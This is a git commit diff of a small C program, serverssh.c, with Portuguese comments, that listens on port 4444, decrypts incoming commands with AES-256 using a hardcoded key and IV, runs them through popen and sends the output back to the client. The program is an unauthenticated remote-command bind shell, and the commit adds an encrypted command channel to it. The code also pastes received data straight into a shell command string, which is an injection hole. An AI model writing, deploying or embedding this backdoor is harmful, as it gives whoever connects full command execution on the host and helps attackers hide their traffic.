51adfd9c9822bb801e037bb516d57358dd69f449
Rafael Medeiros <rafaelgurudesign@gmail.com>
2025-06-29 22:31:40 -0300

    add eas crypted communication

--- serverssh.c
+++ serverssh.c
@@ -1,49 +1,106 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
 #include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
 
-int main()
-{
-    int sock = 0;
+#define PORT 4444
 
-    struct sockaddr_in serv_addr;
+// Chave e IV fixos em hexadecimal (AES-256-CBC)
+#define KEY_HEX "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
+#define IV_HEX  "0102030405060708090a0b0c0d0e0f10"
 
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-    {
-        printf("Erro na criacao do socket");
-        return -1;
-    }
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(8080);
-    serv_addr.sin_addr.s_addr = INADDR_ANY;
-
-    bind(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-
-    listen(sock, 5);
-
-    int addrlen = sizeof(serv_addr);
-    int connection = accept(sock, (struct sockaddr *)&serv_addr, (socklen_t *)&addrlen);
-
-    char message[1024];
-    char buffer[1024];
-    char line[1024];
-
+int main() {
+    int server_sock, client_sock;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t client_len = sizeof(client_addr);
+    char buffer[2048];
+    char command[4096];
+    char output[2048];
     FILE *fp;
 
-    while (1)
-    {
-        read(connection, buffer, 1024);
-        fp = popen(buffer, "r");
-
-        while (fgets(line, sizeof(line), fp) != NULL)
-        {
-            send(connection, line, strlen(line), 0);
-        }
+    // Criação do socket
+    server_sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_sock < 0) {
+        perror("Erro ao criar socket");
+        exit(1);
     }
-    close(connection);
-    close(sock);
+
+    // Configura o endereço do servidor
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(PORT);
+
+    // Faz o bind
+    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Erro no bind");
+        close(server_sock);
+        exit(1);
+    }
+
+    // Escuta conexões
+    listen(server_sock, 1);
+    printf("Servidor escutando na porta %d...\n", PORT);
+
+    // Aceita conexão
+    client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_len);
+    if (client_sock < 0) {
+        perror("Erro no accept");
+        close(server_sock);
+        exit(1);
+    }
+
+    printf("Conexão recebida de %s\n", inet_ntoa(client_addr.sin_addr));
+
+    while (1) {
+        memset(buffer, 0, sizeof(buffer));
+        int n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
+        if (n <= 0) break;
+
+        buffer[n] = '\0';
+
+        // Comando openssl para decifrar
+        snprintf(command, sizeof(command),
+            "echo '%s' | openssl enc -aes-256-cbc -a -d -K %s -iv %s 2>/dev/null",
+            buffer, KEY_HEX, IV_HEX);
+
+        // Executa a decifragem
+        fp = popen(command, "r");
+        if (!fp) {
+            char *msg = "Erro ao decifrar comando\n";
+            send(client_sock, msg, strlen(msg), 0);
+            continue;
+        }
+
+        // Lê o comando decifrado
+        char decrypted[1024];
+        if (fgets(decrypted, sizeof(decrypted), fp) == NULL) {
+            char *msg = "Falha na leitura do comando\n";
+            send(client_sock, msg, strlen(msg), 0);
+            pclose(fp);
+            continue;
+        }
+        decrypted[strcspn(decrypted, "\n")] = 0; // Remove newline
+        pclose(fp);
+
+        // Executa o comando real
+        fp = popen(decrypted, "r");
+        if (!fp) {
+            char *msg = "Erro ao executar comando\n";
+            send(client_sock, msg, strlen(msg), 0);
+            continue;
+        }
+
+        // Envia saída do comando
+        while (fgets(output, sizeof(output), fp)) {
+            send(client_sock, output, strlen(output), 0);
+        }
+
+        pclose(fp);
+    }
+
+    close(client_sock);
+    close(server_sock);
     return 0;
 }
